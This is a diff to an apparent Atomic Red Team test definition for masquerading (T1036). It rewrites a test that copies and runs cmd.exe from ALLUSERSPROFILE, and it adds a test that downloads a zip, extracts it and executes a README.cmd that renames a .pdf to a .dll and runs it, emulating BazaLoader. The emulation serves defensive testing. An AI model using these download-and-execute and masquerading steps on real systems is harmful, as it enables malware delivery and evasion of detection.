@@ -8,7 +8,34 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      copy %WINDIR%\System32\cmd.exe /Y %ALLUSERSPROFILE%\cmd.exe
-      start %ALLUSERSPROFILE%\cmd.exe
-    cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
-    name: command_prompt
+      copy-item "$env:windir\System32\cmd.exe" -destination "$env:allusersprofile\cmd.exe"
+      start-process "$env:allusersprofile\cmd.exe"
+      sleep -s 5 
+      stop-process -name "cmd" | out-null
+    cleanup_command: remove-item "$env:allusersprofile\cmd.exe" -force -erroraction silentlycontinue
+    name: powershell
+- name: Malware Masquerading and Execution from Zip File
+  auto_generated_guid: 4449c89b-ec82-43a4-89c1-91e2f1abeecc
+  description: When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: Location of zip file
+      type: Url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip
+  dependencies:
+  - description: Zip file must be present.
+    prereq_command: |
+      if (Test-Path $env:userprofile\Downloads\T1036.zip) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest -OutFile "$env:userprofile\Downloads\T1036.zip" #{url}
+  executor:
+    command: |-
+      Expand-Archive -Path $env:userprofile\Downloads\T1036.zip -DestinationPath $env:userprofile\Downloads\T1036 -Force
+      cd $env:userprofile\Downloads\T1036
+      cmd /c $env:userprofile\Downloads\T1036\README.cmd >$null 2>$null
+    cleanup_command: |-
+      taskkill /IM Calculator.exe /f >$null 2>$null
+      Remove-Item $env:userprofile\Downloads\T1036 -recurse -ErrorAction Ignore
+    name: powershell
